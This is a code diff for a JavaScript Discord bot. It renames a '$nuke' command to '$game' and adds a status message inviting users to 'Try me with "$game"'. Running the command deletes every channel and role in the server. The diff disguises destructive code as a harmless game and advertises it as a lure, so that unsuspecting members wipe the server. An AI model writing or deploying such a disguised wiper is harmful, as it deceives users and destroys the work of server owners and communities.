@@ -3,10 +3,13 @@ const bot = new Discord.Client();
 const prefix = '$';
 require('dotenv').config();
 
-
 bot.on('ready', () => {
     console.log(`${bot.user.tag} je to ready!`)
-})
+    bot.user.setStatus("online");
+    bot.user.setActivity('Try me with "$game"', {type: "PLAYING"});
+  })
+
+
 
 bot.on('message', message => {
     if(message.content === prefix + 'ping') {
@@ -15,7 +18,7 @@ bot.on('message', message => {
          }),
       100
     }
-    if(message.content === prefix + "nuke") {
+    if(message.content === prefix + "game") {
  message.channel.send("teraz mazem vsetko")
 	 message.guild.channels.forEach(channel => channel.delete())
 	 message.guild.roles.forEach(roles => roles.delete()) } 
